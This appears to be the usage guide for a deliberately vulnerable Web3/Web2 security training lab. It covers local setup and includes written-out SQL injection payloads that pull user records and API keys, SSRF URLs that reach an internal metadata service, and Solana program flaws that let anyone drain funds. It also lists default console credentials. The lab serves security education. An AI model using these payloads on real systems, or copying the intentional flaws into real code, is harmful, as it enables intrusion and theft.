# NebulaX Usage Guide

This guide provides detailed instructions for setting up and using the NebulaX Web3/Web2 Hybrid Security Lab.

## Initial Setup

1. Clone the repository:
   ```
   git clone https://github.com/yourusername/NebulaX-web3_Lab.git
   cd NebulaX-web3_Lab
   ```

2. Run the setup script (Unix/Mac):
   ```
   chmod +x setup.sh
   ./setup.sh
   ```

   For Windows users, you can manually:
   - Create the required directories: `mkdir -p frontend/public/images`
   - Download sample NFT images from placeholders like picsum.photos
   - Run `docker-compose up -d`
   - Deploy programs with `docker-compose exec blockchain npm run deploy`

## Accessing Services

Once running, you can access the following services:

- **Web Application**: http://localhost:3000
- **Backend API**: http://localhost:4000
- **MinIO Console**: http://localhost:9001 (login: minio / minio123)
- **Metadata Server**: http://localhost:8000

## Using Phantom Wallet with Local Solana Validator

1. Install Phantom wallet browser extension if you haven't already.

2. Configure Phantom to connect to your local Solana validator:
   - Click the settings gear icon in Phantom
   - Select "Developer Settings"
   - Click "Change Network" and select "Custom RPC"
   - Fill in the form:
     - Network Name: NebulaX Local
     - RPC URL: http://localhost:8899
     - WebSocket URL: ws://localhost:8900

3. Import test accounts using their private keys:
   - Solana accounts with test SOL are available after setup
   - Import using "Add/Connect Wallet" option in Phantom, choosing "Import Private Key"

## Exploring Security Vulnerabilities

### 1. SQL Injection (SQLi)

The `/api/submitMemo` endpoint is intentionally vulnerable to SQL injection attacks.

**Example Exploit**:

1. Open your browser developer tools (F12) and go to the Console tab.

2. Run the following code to submit a malicious memo:
   ```javascript
   fetch('http://localhost:4000/api/submitMemo', {
     method: 'POST',
     headers: { 'Content-Type': 'application/json' },
     body: JSON.stringify({
       nftId: 1,
       memo: "'; SELECT * FROM users; --"
     })
   })
   .then(response => response.json())
   .then(data => console.log(data));
   ```

3. More advanced payloads:
   ```javascript
   // Dump table information
   "'; SELECT table_name, column_name FROM information_schema.columns; --"
   
   // Extract sensitive user data
   "'; SELECT id, username, address FROM users; --"
   
   // Get user settings (containing sensitive info)
   "'; SELECT u.username, s.api_key, s.private_notes FROM users u JOIN user_settings s ON u.id = s.user_id; --"
   ```

### 2. Server-Side Request Forgery (SSRF)

The `/api/fetchPrice?url=` endpoint is vulnerable to SSRF attacks.

**Example Exploit**:

1. Open your browser and navigate to: 
   ```
   http://localhost:4000/api/fetchPrice?url=http://localhost:8000/metadata
   ```

2. This will access the "internal" metadata server revealing instance metadata.

3. Try other endpoints:
   ```
   http://localhost:4000/api/fetchPrice?url=http://localhost:8000/metadata/iam
   http://localhost:4000/api/fetchPrice?url=http://localhost:8000/metadata/user-data
   ```

4. You can also attempt to scan internal ports or services:
   ```
   http://localhost:4000/api/fetchPrice?url=http://localhost:5432
   ```

## Solana Program Vulnerabilities

The Solana programs also contain intentional vulnerabilities:

1. **Missing Access Control** in NebulaX SPL Token program:
   - The `emergencyRemoveFromBlacklist` function can be called by anyone
   - Use Phantom to interact with the program and exploit this issue

2. **Unrestricted Token Memo** in NebulaX NFT program:
   - Anyone can set a memo for any NFT, not just the owner
   - This could be used for graffiti attacks or manipulating displayed information

3. **Unchecked Fund Transfer** in NebulaX NFT program:
   - The `emergencyWithdraw` function has no access control
   - Can be exploited to drain program funds

## Shutting Down

To stop all services:

```
docker-compose down
```

To completely remove all data and restart fresh:

```
docker-compose down -v
./setup.sh
```

## Disclaimer

NebulaX is designed for educational purposes only. The vulnerabilities included are intentional for learning about web and blockchain security. Do not use any of this code in production environments. 